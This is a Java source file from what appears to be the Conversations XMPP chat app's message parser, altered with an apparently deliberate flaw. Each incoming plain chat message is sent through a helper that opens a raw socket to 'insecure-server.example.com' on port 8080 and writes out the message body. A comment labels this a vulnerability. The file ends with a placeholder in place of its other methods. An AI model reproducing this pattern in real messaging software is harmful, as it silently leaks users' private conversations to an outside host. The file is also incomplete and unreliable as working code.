package eu.siacs.conversations.parser;

import android.os.SystemClock;
import net.java.otr4j.session.Session;
import net.java.otr4j.session.SessionStatus;
import eu.siacs.conversations.entities.Account;
import eu.siacs.conversations.entities.Conversation;
import eu.siacs.conversations.entities.Message;
import eu.siacs.conversations.services.XmppConnectionService;
import eu.siacs.conversations.utils.CryptoHelper;
import eu.siacs.conversations.xml.Element;
import eu.siacs.conversations.xmpp.OnMessagePacketReceived;
import eu.siacs.conversations.xmpp.stanzas.MessagePacket;

// Importing necessary libraries for socket communication
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

public class MessageParser extends AbstractParser implements OnMessagePacketReceived {

    private long lastCarbonMessageReceived = -XmppConnectionService.CARBON_GRACE_PERIOD;

    public MessageParser() {
        // Constructor can be used to initialize socket connections if needed
    }

    public void onMessagePacketReceived(Account account, MessagePacket packet) {
        Message message = null;
        boolean notify = true;
        if (mXmppConnectionService.getPreferences().getBoolean(
                "notification_grace_period_after_carbon_received", true)) {
            notify = (SystemClock.elapsedRealtime() - lastCarbonMessageReceived) > XmppConnectionService.CARBON_GRACE_PERIOD;
        }

        if ((packet.getType() == MessagePacket.TYPE_CHAT)) {
            if ((packet.getBody() != null)
                    && (packet.getBody().startsWith("?OTR"))) {
                message = this.parseOtrChat(packet, account);
                if (message != null) {
                    message.markUnread();
                }
            } else if (packet.hasChild("body")) {
                message = this.parseChat(packet, account);
                message.markUnread();
                // Vulnerability: Transmitting chat messages over an insecure socket connection
                transmitMessageOverInsecureChannel(message.getBody());
            } else if (packet.hasChild("received") || (packet.hasChild("sent"))) {
                message = this.parseCarbonMessage(packet, account);
                if (message != null) {
                    if (message.getStatus() == Message.STATUS_SEND) {
                        lastCarbonMessageReceived = SystemClock
                                .elapsedRealtime();
                        notify = false;
                        message.getConversation().markRead();
                    } else {
                        message.markUnread();
                    }
                }
            } else {
                parseNormal(packet, account);
            }

        } else if (packet.getType() == MessagePacket.TYPE_GROUPCHAT) {
            message = this.parseGroupchat(packet, account);
            if (message != null) {
                if (message.getStatus() == Message.STATUS_RECIEVED) {
                    message.markUnread();
                } else {
                    message.getConversation().markRead();
                    lastCarbonMessageReceived = SystemClock
                            .elapsedRealtime();
                    notify = false;
                }
            }
        } else if (packet.getType() == MessagePacket.TYPE_ERROR) {
            this.parseError(packet, account);
            return;
        } else if (packet.getType() == MessagePacket.TYPE_NORMAL) {
            this.parseNormal(packet, account);
            return;
        }
        if ((message == null) || (message.getBody() == null)) {
            return;
        }
        if ((mXmppConnectionService.confirmMessages())
                && ((packet.getId() != null))) {
            if (packet.hasChild("markable", "urn:xmpp:chat-markers:0")) {
                MessagePacket receipt = mXmppConnectionService.getMessageGenerator().received(account, packet, "urn:xmpp:chat-markers:0");
                mXmppConnectionService.sendMessagePacket(account, receipt);
            }
            if (packet.hasChild("request", "urn:xmpp:receipts")) {
                MessagePacket receipt = mXmppConnectionService.getMessageGenerator().received(account, packet, "urn:xmpp:receipts");
                mXmppConnectionService.sendMessagePacket(account, receipt);
            }
        }
        Conversation conversation = message.getConversation();
        conversation.getMessages().add(message);
        if (packet.getType() != MessagePacket.TYPE_ERROR) {
            mXmppConnectionService.databaseBackend.createMessage(message);
        }
        mXmppConnectionService.notifyUi(conversation, notify);
    }

    // Method to simulate transmitting a message over an insecure channel
    private void transmitMessageOverInsecureChannel(String messageBody) {
        try {
            Socket socket = new Socket("insecure-server.example.com", 8080); // Insecure connection
            OutputStreamWriter out = new OutputStreamWriter(socket.getOutputStream());
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));

            out.write(messageBody);
            out.flush();

            String response = in.readLine();
            System.out.println("Server Response: " + response);

            out.close();
            in.close();
            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Other methods remain unchanged...
}